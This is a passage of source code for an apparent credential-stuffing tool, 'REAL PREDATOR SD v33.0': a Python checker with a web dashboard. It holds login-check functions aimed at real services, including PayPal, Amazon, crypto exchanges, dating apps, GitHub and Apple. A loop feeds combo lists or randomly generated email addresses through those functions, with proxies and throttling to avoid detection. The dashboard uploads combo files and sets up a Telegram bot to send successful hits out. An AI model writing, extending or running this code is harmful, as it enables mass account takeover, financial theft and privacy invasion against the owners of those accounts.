            login = session.post(auth_url.group(1), data={"email": username, "password": password}, allow_redirects=True, timeout=10)
            if "browse" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_spotify(self, username, password, session):
        try:
            login = session.post("https://accounts.spotify.com/api/login", data={"username": username, "password": password}, timeout=10)
            if "accessToken" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_amazon(self, username, password, session):
        try:
            resp = session.get("https://www.amazon.com/ap/signin", timeout=10)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://www.amazon.com/ap/signin", data={"email": username, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
            if "your-account" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_hulu(self, username, password, session):
        try:
            login = session.post("https://auth.hulu.com/api/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_disney(self, username, password, session):
        try:
            login = session.post("https://www.disneyplus.com/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_hbomax(self, username, password, session):
        try:
            login = session.post("https://auth.hbomax.com/api/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_paypal(self, username, password, session):
        try:
            resp = session.get("https://www.paypal.com/signin", timeout=10)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://www.paypal.com/signin", data={"login_email": username, "login_password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
            if "myaccount" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_binance(self, username, password, session):
        try:
            login = session.post("https://www.binance.com/api/v1/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_coinbase(self, username, password, session):
        try:
            login = session.post("https://api.coinbase.com/v2/oauth/token", json={"grant_type": "password", "username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_kraken(self, username, password, session):
        try:
            login = session.post("https://api.kraken.com/0/private/Login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_robinhood(self, username, password, session):
        try:
            login = session.post("https://api.robinhood.com/api/v1/auth/login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_tinder(self, username, password, session):
        try:
            login = session.post("https://api.gotinder.com/v2/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_bumble(self, username, password, session):
        try:
            login = session.post("https://bumble.com/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_hinge(self, username, password, session):
        try:
            login = session.post("https://api.hinge.com/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_okcupid(self, username, password, session):
        try:
            login = session.post("https://www.okcupid.com/login", data={"email": username, "password": password}, timeout=10)
            if "dashboard" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_grindr(self, username, password, session):
        try:
            login = session.post("https://api.grindr.com/v1/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_badoo(self, username, password, session):
        try:
            login = session.post("https://badoo.com/api/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_muzz(self, username, password, session):
        try:
            login = session.post("https://api.muzz.com/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_shaadi(self, username, password, session):
        try:
            login = session.post("https://api.shaadi.com/v1/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_github(self, username, password, session):
        try:
            resp = session.get("https://github.com/login", timeout=10)
            csrf = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://github.com/session", data={"login": username, "password": password, "authenticity_token": csrf.group(1)}, allow_redirects=True, timeout=10)
            if "github.com" in login.url and "login" not in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_apple(self, username, password, session):
        try:
            login = session.post("https://idmsa.apple.com/appleauth/auth/signin", json={"accountName": username, "password": password}, timeout=10)
            if login.status_code == 200 and "authType" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_zoom(self, username, password, session):
        try:
            login = session.post("https://zoom.us/signin", data={"email": username, "password": password}, timeout=10)
            if "dashboard" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'

# ================================================================
# STATE
# ================================================================
state = {
    'running': False,
    'checked': 0,
    'hits': 0,
    'bad': 0,
    'errors': 0,
    'feed': [],
    'results': [],
    'current_testing': [],
    'lock': threading.Lock(),
    'cpm': 0,
    'start_time': None,
    'total': 1000
}

predator = UltimatePredator()

# ================================================================
# PREDATOR LOOP - WITH POWER HUNT
# ================================================================
def predator_loop():
    last_count = 0
    last_time = datetime.now()
    accounts_per_minute = 5  # 100 accounts in 20 minutes
    delay_between_checks = 12  # seconds (60/5 = 12 seconds per account)
    
    while state['running']:
        try:
            if predator.combos:
                combo = predator.combos.pop(0)
                # Use power hunt for better results
                results = predator.power_hunt(combo[0])
                with state['lock']:
                    state['checked'] += 1
                    if results:
                        for r in results:
                            if r.get('status') == 'hit':
                                state['hits'] += 1
                                state['results'].append(r)
                            else:
                                state['bad'] += 1
                    state['feed'] = predator.feed[-50:]
                    state['results'] = predator.results[-30:]
                    state['current_testing'] = predator.current_testing
            else:
                # Generate random accounts if no combo
                names = ['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed','fatima','layla','omar','hassan']
                domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'protonmail.com']
                name = random.choice(names) + str(random.randint(1, 999))
                domain = random.choice(domains)
                predator.power_hunt(f"{name}@{domain}")
                with state['lock']:
                    state['checked'] += 1
            
            now = datetime.now()
            elapsed = (now - last_time).total_seconds()
            if elapsed >= 60:
                with state['lock']:
                    state['cpm'] = int((state['checked'] - last_count) / (elapsed / 60))
                last_count = state['checked']
                last_time = now
            
            time.sleep(delay_between_checks + random.uniform(-1, 1))
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
            time.sleep(2)

# ================================================================
# HTML TEMPLATES
# ================================================================

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD - Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px;width:400px;text-align:center}
.logo-text{font-family:'Orbitron',monospace;font-size:28px;color:#00ff41}
.logo-text span{color:#ff0044}
.logo-text .sd{font-size:16px;color:#ffd700}
.subtitle{color:#006622;font-size:10px;margin:5px 0 15px;letter-spacing:3px}
.input-group input{width:100%;padding:14px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:16px;text-align:center;margin:10px 0}
.btn-login{width:100%;padding:14px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;cursor:pointer;font-family:'Orbitron',monospace;transition:all 0.3s}
.btn-login:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 40px rgba(0,255,65,0.05)}
.btn-login:disabled{opacity:0.4}
.error-msg{color:#ff0044;font-size:12px;margin-top:10px;min-height:20px}
.hint{color:#006622;font-size:8px;margin-top:8px}
.social-buttons{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap}
.social-btn{padding:8px 20px;border-radius:30px;font-size:12px;text-decoration:none;color:#fff;transition:all 0.3s}
.social-btn.whatsapp{background:#25D366}
.social-btn.telegram{background:#0088CC}
.social-btn:hover{transform:scale(1.05)}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo-text">REAL <span>PREDATOR</span> <span class="sd">SD</span></div>
    <div class="subtitle">⚡ v33.0 ULTIMATE HUNTER</div>
    <div class="input-group">
        <input type="password" id="passInput" placeholder="🔑 Enter Password">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
    <div class="hint">🔐 Secure Access Only</div>
    <div class="social-buttons">
        <a href="https://wa.me/249907118667" target="_blank" class="social-btn whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
        <a href="https://t.me/MRDPY" target="_blank" class="social-btn telegram"><i class="fab fa-telegram"></i> Telegram</a>
    </div>
</div>
<script>
const passInput=document.getElementById('passInput');
const loginBtn=document.getElementById('loginBtn');
const errorMsg=document.getElementById('errorMsg');
function doLogin(){
    const password=passInput.value.trim();
    if(!password){errorMsg.textContent='⚠️ Enter password';return;}
    loginBtn.disabled=true;loginBtn.textContent='⏳...';errorMsg.textContent='';
    fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:password})})
    .then(res=>res.json()).then(data=>{
        loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';
        if(data.success){window.location.href='/dashboard';}
        else{errorMsg.textContent='❌ '+data.error;passInput.value='';}
    }).catch(()=>{loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';errorMsg.textContent='⚠️ Error';});
}
loginBtn.addEventListener('click', doLogin);
passInput.addEventListener('keypress', e=>{if(e.key==='Enter')doLogin();});
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD v33.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;padding:10px}
.container{max-width:1500px;margin:0 auto}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-radius:8px 8px 0 0}
.header h1{font-family:'Orbitron',monospace;font-size:20px;color:#00ff41}
.header h1 span{color:#ff0044}
.header .sd{font-size:14px;color:#ffd700}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:10px 22px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s}
.btn:hover:not(:disabled){background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start:hover:not(:disabled){box-shadow:0 0 40px rgba(0,255,65,0.1)}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-stop:hover:not(:disabled){background:rgba(255,0,68,0.05)}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn-logout{color:#ff0044;border-color:#ff0044;background:transparent;padding:10px 22px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s;border:1px solid #ff0044;text-decoration:none}
.btn-logout:hover{background:rgba(255,0,68,0.05)}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:15px;margin-bottom:8px}

/* STATS RECTANGLE */
.stats-rectangle{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:10px 0;padding:15px;background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:10px}
.stat-item{text-align:center;padding:12px;border-radius:8px;background:rgba(0,0,0,0.6)}
.stat-item .number{font-size:32px;font-weight:700;display:block;font-family:'Orbitron',monospace}
.stat-item .label{font-size:10px;color:#006622;margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.stat-item.hits .number{color:#00ff41}
.stat-item.bad .number{color:#ff0044}
.stat-item.total .number{color:#ffd700}
.stat-item.testing .number{color:#ffaa00}
.stat-item.rate .number{color:#0088cc}
.stat-item.time .number{color:#0066ff;font-size:24px}

/* CURRENT TESTING DISPLAY */
.testing-box{background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-radius:8px;padding:12px;margin:8px 0;min-height:50px}
.testing-box .label{color:#ffaa00;font-size:11px}
.testing-box .content{color:#ffaa00;font-size:14px;font-weight:700;margin-top:5px}

.status-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 18px;border-radius:6px;font-size:13px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044;animation:pulse-border 2s infinite}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:8px;height:8px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse-dot 1.5s infinite}
.status-dot.stopped{background:#00ff41}
@keyframes pulse-dot{0%,100%{opacity:1;box-shadow:0 0 20px rgba(255,0,68,0.3)}50%{opacity:0.3;box-shadow:0 0 60px rgba(255,0,68,0.6)}}
@keyframes pulse-border{0%,100%{border-color:#ff0044}50%{border-color:rgba(255,0,68,0.3)}}

.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:4px 10px;font-size:10px;border-left:2px solid transparent;display:flex;gap:8px;animation:slideIn 0.3s}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item .time{color:#006622;font-size:8px;min-width:50px}
@keyframes slideIn{from{opacity:0;transform:translateX(-15px)}to{opacity:1;transform:translateX(0)}}

.result-container{max-height:400px;overflow-y:auto}
.result-item{padding:6px 12px;font-size:10px;border-bottom:1px solid rgba(0,255,65,0.05)}
.result-item.hit{background:rgba(0,255,65,0.03)}
.result-item.gaming{background:rgba(255,215,0,0.05);border-left:2px solid #ffd700}

.control-bar{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.config-row input{padding:8px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:11px;font-family:'Share Tech Mono',monospace}
.config-row input:focus{outline:none;border-color:#00ff41}

.platform-select{display:flex;gap:10px;align-items:center;flex-wrap:wrap;background:rgba(0,0,0,0.5);padding:12px 15px;border-radius:6px;border:1px solid rgba(0,255,65,0.05)}
.platform-select select{padding:8px 14px;background:rgba(0,0,0,0.8);color:#00ff41;border:1px solid #00ff41;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:11px;min-width:200px}
.platform-select select:focus{outline:none}
.empty-state{text-align:center;padding:20px;color:#006622;font-size:11px}

.gaming-badge{color:#ffd700;margin-right:5px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:5px;margin:8px 0}
.platform-badge{padding:8px 4px;border-radius:6px;text-align:center;font-size:8px;border:1px solid rgba(0,255,65,0.06);background:rgba(0,0,0,0.6);color:#006622;cursor:pointer;transition:all 0.3s}
.platform-badge:hover{background:rgba(0,255,65,0.05);border-color:#00ff41;transform:scale(1.05)}
.platform-badge.selected{background:rgba(0,255,65,0.1);border-color:#00ff41;color:#00ff41;box-shadow:0 0 20px rgba(0,255,65,0.05)}
.platform-badge .icon{font-size:20px;display:block;margin-bottom:2px}
.platform-badge.gaming{border-color:#ffd700;color:#ffd700}
.platform-badge.gaming.selected{background:rgba(255,215,0,0.1);border-color:#ffd700}

.telegram-config{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:8px 12px;background:rgba(0,136,204,0.05);border:1px solid rgba(0,136,204,0.15);border-radius:6px;margin-bottom:6px}
.telegram-config input{padding:6px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,136,204,0.2);border-radius:4px;color:#00ff41;font-size:10px;font-family:'Share Tech Mono',monospace;flex:1;min-width:120px}
.telegram-config label{color:#0088cc;font-size:10px}
.telegram-config .status{font-size:9px;padding:3px 12px;border-radius:12px}
.telegram-config .status.on{background:rgba(0,255,65,0.1);color:#00ff41;border:1px solid #00ff41}
.telegram-config .status.off{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}

@media(max-width:768px){.stats-rectangle{grid-template-columns:repeat(3,1fr)}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span style="font-size:12px;color:#006622;">v33.0</span></h1>
        <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
            <a href="https://wa.me/249907118667" target="_blank" style="color:#25D366;text-decoration:none;"><i class="fab fa-whatsapp"></i> WhatsApp</a>
            <a href="https://t.me/MRDPY" target="_blank" style="color:#0088cc;text-decoration:none;"><i class="fab fa-telegram"></i> Telegram</a>
            <a href="/logout" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>
    </header>

    <div class="telegram-config">
        <label><i class="fab fa-telegram"></i> Token:</label>
        <input type="text" id="tgToken" placeholder="Bot Token">
        <label>Chat ID:</label>
        <input type="text" id="tgChatId" placeholder="Chat ID">
        <button class="btn" id="tgSaveBtn" style="border-color:#0088cc;color:#0088cc;padding:6px 14px;font-size:10px;"><i class="fas fa-save"></i> Save</button>
        <button class="btn" id="tgTestBtn" style="border-color:#ffd700;color:#ffd700;padding:6px 14px;font-size:10px;"><i class="fas fa-paper-plane"></i> Test</button>
        <span class="status off" id="tgStatus">⚪ OFF</span>
    </div>

    <div class="platform-select">
        <label>🎯 Target Platform:</label>
        <select id="targetPlatform">
            <option value="">🔄 Random (All {{ platforms|length }} Platforms)</option>
            {% for p in platforms %}
            <option value="{{ p.name }}">{{ p.name }}</option>
            {% endfor %}
        </select>
        <button class="btn" id="applyTargetBtn" style="border-color:#ffd700;color:#ffd700;padding:6px 16px;">Apply</button>
        <span id="targetStatus" style="color:#006622;font-size:11px;">⚪ Random</span>
    </div>

    <div class="card">
        <div class="platform-grid" id="platformGrid">
            {% for p in platforms %}
            <div class="platform-badge {% if p.gaming %}gaming{% endif %}" data-platform="{{ p.name }}" onclick="selectPlatform('{{ p.name }}')">
                <span class="icon"><i class="{{ p.icon }}" style="color:{{ p.color }}"></i></span>
                {{ p.name[:8] }}
            </div>
            {% endfor %}
        </div>
    </div>

    <!-- STATS RECTANGLE -->
    <div class="stats-rectangle" id="statsRectangle">
        <div class="stat-item hits"><span class="number" id="statHits">0</span><span class="label">✅ HITS</span></div>
        <div class="stat-item bad"><span class="number" id="statBad">0</span><span class="label">❌ BAD</span></div>
        <div class="stat-item total"><span class="number" id="statTotal">0</span><span class="label">📊 TOTAL</span></div>
        <div class="stat-item testing"><span class="number" id="statTesting">0</span><span class="label">🔄 TESTING</span></div>
        <div class="stat-item rate"><span class="number" id="statRate">0%</span><span class="label">📈 SUCCESS</span></div>
        <div class="stat-item time"><span class="number" id="statTime">00:00</span><span class="label">⏱ ELAPSED</span></div>
    </div>

    <!-- CURRENT TESTING -->
    <div class="testing-box">
        <div class="label">🔄 CURRENTLY TESTING</div>
        <div class="content" id="currentTesting">⏳ Waiting...</div>
    </div>

    <div class="card">
        <div style="display:flex;gap:15px;flex-wrap:wrap;align-items:center;">
            <span class="status-badge stopped" id="statusBadge">
                <span class="status-dot stopped" id="statusDot"></span>
                <span id="statusText">OFF</span>
            </span>
            <span style="color:#006622;font-size:11px;">⚡ <span id="cpm">0</span> RPM</span>
            <span style="color:#ff0044;">⚠️ <span id="errorCount">0</span></span>
            <span style="color:#ffd700;">🎮 <span id="gamingCount">0</span></span>
        </div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i> Clear</button>
            <div class="config-row">
                <label>Speed:</label>
                <input type="number" id="speedInput" value="5" min="1" max="10" style="width:60px;">
                <span style="color:#006622;font-size:9px;">accounts/min</span>
            </div>
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="config-row">
                <label><i class="fas fa-upload"></i> Combo:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;" multiple>
                <label for="comboFile" style="padding:6px 12px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;cursor:pointer;font-size:10px;">Choose</label>
                <span id="comboName" style="color:#006622;font-size:9px;">None</span>
            </div>
            <div class="config-row" style="flex:1;min-width:200px;">
                <label><i class="fas fa-network-wired"></i> Proxy:</label>
                <textarea id="proxyInput" placeholder="proxy:port" style="height:30px;font-size:9px;flex:1;min-width:100px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;padding:4px;"></textarea>
                <button class="btn" id="proxyApplyBtn" style="padding:4px 12px;font-size:10px;">Apply</button>
                <span id="proxyCount" style="color:#006622;font-size:9px;">0</span>
            </div>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#00cc33;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-broadcast"></i> FEED <span style="font-size:9px;color:#006622;" id="feedCount">(0)</span></span>
        </div>
        <div class="feed-container" id="feedContainer"><div class="empty-state">⏳ Waiting for activity...</div></div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-database"></i> HITS <span style="font-size:9px;color:#006622;" id="resultCount">(0)</span></span>
            <span style="font-size:9px;color:#ffd700;">🎮 Gaming accounts highlighted</span>
        </div>
        <div class="result-container" id="resultContainer"><div class="empty-state">📭 No hits yet</div></div>
    </div>

    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v33.0 | {{ platforms|length }}+ Platforms | Developer: @MRDPY
    </div>
</div>

<script>
const $ = id => document.getElementById(id);

async function api(endpoint, method='GET', data=null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (data) opts.body = JSON.stringify(data);
    try {
        const res = await fetch(endpoint, opts);
        return await res.json();
    } catch (e) {
        console.error('API Error:', e);
        return { success: false, error: e.message };
    }
}

function selectPlatform(platform) {
    document.querySelectorAll('.platform-badge').forEach(el => {
        el.classList.toggle('selected', el.dataset.platform === platform);
    });
    document.getElementById('targetPlatform').value = platform;
}

document.getElementById('applyTargetBtn').addEventListener('click', async function() {
    const platform = document.getElementById('targetPlatform').value;
    const res = await api('/api/target', 'POST', { platform: platform });
    if (res.success) {
        document.getElementById('targetStatus').textContent = platform ? '🎯 ' + platform : '⚪ Random';
        document.getElementById('targetStatus').style.color = platform ? '#ffd700' : '#006622';
    }
});

document.getElementById('tgSaveBtn').addEventListener('click', async function() {
    const token = document.getElementById('tgToken').value.trim();
    const chatId = document.getElementById('tgChatId').value.trim();
    if (!token || !chatId) { alert('⚠️ Enter Token and Chat ID'); return; }
    const res = await api('/api/tg_config', 'POST', { token, chat_id: chatId });
    if (res.success) {
        document.getElementById('tgStatus').className = 'status on';
        document.getElementById('tgStatus').textContent = '✅ ON';
        alert('✅ Telegram configured!');
    }
});

document.getElementById('tgTestBtn').addEventListener('click', async function() {
    const token = document.getElementById('tgToken').value.trim();
    const chatId = document.getElementById('tgChatId').value.trim();
    if (!token || !chatId) { alert('⚠️ Enter Token and Chat ID'); return; }
    try {
        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: '⚡ Test from REAL PREDATOR SD v33.0' })
        });
        const data = await resp.json();
        if (data.ok) {
            document.getElementById('tgStatus').className = 'status on';
            document.getElementById('tgStatus').textContent = '✅ ON';
            alert('✅ Test message sent!');
        } else {
            alert('❌ Failed: ' + data.description);
        }
    } catch (e) { alert('❌ Connection error'); }
});

document.getElementById('comboFile').addEventListener('change', function(e) {
    if (this.files.length > 0) {
        document.getElementById('comboName').textContent = this.files[0].name;
        Array.from(this.files).forEach(file => {
            const reader = new FileReader();
            reader.onload = async function(ev) {
                await api('/api/upload/combo', 'POST', { content: ev.target.result });
            };
            reader.readAsText(file);
        });
    }
});

document.getElementById('proxyApplyBtn').addEventListener('click', async function() {
    const content = document.getElementById('proxyInput').value;
    if (!content.trim()) { alert('Enter proxies'); return; }
    const res = await api('/api/upload/proxy', 'POST', { content: content });
    if (res.success) {
        document.getElementById('proxyCount').textContent = res.count;
        alert('✅ Applied ' + res.count + ' proxies');
    }
});

document.getElementById('startBtn').addEventListener('click', async function() {
    const speed = parseInt(document.getElementById('speedInput').value) || 5;
    const target = document.getElementById('targetPlatform').value;
    const tgToken = document.getElementById('tgToken').value.trim();
    const tgChatId = document.getElementById('tgChatId').value.trim();
    const data = { speed, target };
    if (tgToken) data.tg_token = tgToken;
    if (tgChatId) data.tg_chat_id = tgChatId;
    const res = await api('/api/start', 'POST', data);
    if (res.success) {
        document.getElementById('statusBadge').className = 'status-badge running';
        document.getElementById('statusDot').className = 'status-dot running';
        document.getElementById('statusText').textContent = 'RUNNING';
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        alert('✅ Hunting started!');
    } else {
        alert('❌ Failed: ' + (res.error || 'Unknown error'));
    }
});

document.getElementById('stopBtn').addEventListener('click', async function() {
    const res = await api('/api/stop', 'POST');
    if (res.success) {
        document.getElementById('statusBadge').className = 'status-badge stopped';
        document.getElementById('statusDot').className = 'status-dot stopped';
        document.getElementById('statusText').textContent = 'OFF';
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        alert('⏹️ Stopped');
    }
});

document.getElementById('clearBtn').addEventListener('click', async function() {
    if (!confirm('Clear all results?')) return;
    await api('/api/clear', 'POST');
});

async function updateStats() {
    try {
        const d = await api('/api/stats');
        if (!d.success) return;
        document.getElementById('statHits').textContent = d.hits || 0;
        document.getElementById('statBad').textContent = d.bad || 0;
        document.getElementById('statTotal').textContent = d.checked || 0;
        document.getElementById('statTesting').textContent = d.testing || 0;
        const total = d.checked || 0;
        const hits = d.hits || 0;
        const rate = total > 0 ? ((hits / total) * 100).toFixed(1) : 0;
        document.getElementById('statRate').textContent = rate + '%';
        document.getElementById('cpm').textContent = d.cpm || 0;
        document.getElementById('errorCount').textContent = d.errors || 0;
        document.getElementById('gamingCount').textContent = d.gaming || 0;
        if (d.current_testing && d.current_testing.length > 0) {
            const ct = d.current_testing[0];
            document.getElementById('currentTesting').textContent = `${ct.platform} | ${ct.username} | ${ct.status === 'hit' ? '✅ HIT' : '❌ BAD'}`;
            document.getElementById('currentTesting').style.color = ct.status === 'hit' ? '#00ff41' : '#ff0044';
        } else {
            document.getElementById('currentTesting').textContent = '⏳ Waiting...';
            document.getElementById('currentTesting').style.color = '#ffaa00';
        }
        if (d.running) {
            document.getElementById('statusBadge').className = 'status-badge running';
            document.getElementById('statusDot').className = 'status-dot running';
            document.getElementById('statusText').textContent = 'RUNNING';
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
        }
        if (d.start_time) {
            const elapsed = Math.floor((Date.now() - d.start_time) / 1000);
            const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
            const secs = String(elapsed % 60).padStart(2, '0');
            document.getElementById('statTime').textContent = mins + ':' + secs;
        }
    } catch (e) { console.error('Stats update error:', e); }
}

async function updateFeed() {
    try {
        const d = await api('/api/feed');
        if (!d.success) return;
        const c = document.getElementById('feedContainer');
        if (!d.feed || d.feed.length === 0) {
            c.innerHTML = '<div class="empty-state">⏳ Waiting for activity...</div>';
            return;
        }
        c.innerHTML = d.feed.slice(0, 50).map(item => {
            const cls = item.type || 'info';
